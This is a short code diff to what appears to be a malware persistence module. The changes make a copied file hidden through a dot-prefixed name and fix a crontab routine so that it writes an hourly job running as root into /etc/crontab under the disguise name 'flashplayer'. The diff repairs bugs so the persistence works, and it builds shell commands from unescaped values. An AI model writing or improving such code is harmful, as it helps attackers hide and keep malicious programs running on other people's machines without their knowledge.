@@ -116,7 +116,7 @@ def _add_hidden_file(value=None):
             else:
                 dirname, basename = os.path.split(value)
                 path = os.path.join(dirname, '.' + basename)
-                hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
+                hide = subprocess.call('cp {} {}'.format(value, path), shell=True) == 0
             return (True if hide else False, path)
         else:
             util.log("File '{}' not found".format(value))
@@ -127,11 +127,11 @@ def _add_hidden_file(value=None):
 def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
     try:
         if sys.platform == 'linux2':
-            value = sys.argv[0]
+            value = os.path.abspath(sys.argv[0])
             if value and os.path.isfile(value):
                 if not _methods['crontab_job'].established:
                     path = value
-                    task = "0 * * * * {} {}".format(path)
+                    task = "0 * * * * root {}".format(path)
                     with open('/etc/crontab', 'r') as fp:
                         data = fp.read()
                     if task not in data:
